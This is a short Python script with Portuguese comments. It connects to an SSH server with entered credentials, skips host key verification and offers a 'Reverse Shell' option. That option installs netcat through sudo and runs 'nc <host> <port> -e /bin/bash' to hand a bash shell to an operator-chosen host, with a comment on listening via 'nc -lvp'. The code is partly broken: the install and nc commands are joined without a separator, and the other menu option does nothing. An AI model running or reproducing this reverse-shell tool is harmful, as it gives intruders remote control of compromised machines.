import paramiko
import threading   


host = input('Enter host: ')
user = input('Enter username: ')
passwd = input('Enter password: ')

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Conecta em conexões SSH sem verificar a chave do host
c.connect(host, username= user, password= passwd) #Passa os parâmetros para a conexão SSH



def exe_terminal():
    urhost = input("Enter your host: ")
    print("Connected to the SSH server. You can now execute commands...\n")
    choose = input ("Choose one: [1] - Free Texting [2] - Reverse Shell: ")
    if choose == "2":
        port = input("Enter the Port: ")
        urhost = input("Enter your host: ")
        cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
        stdin, stdout, stderr = c.exec_command(cmd)
        print(stdout.read().decode())
        err = stderr.read().decode()
        if err:
            print(f"Error {err}")
        print("Starting reverse shell...")           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa
        while True:
            output = stdout.readline()
            if output:
                print(output.strip())

            error = stderr.readline()
            if error:
                print(f"Erro: {error.strip()}")

            # Sai quando o comando terminou e não há mais nada para ler
            if stdout.channel.exit_status_ready() and not output and not error:
                break
        c.close()
    elif choose == "1":
        print("You can now execute commands on the remote server. Type 'exit' to disconnect.\n")

exe_terminal()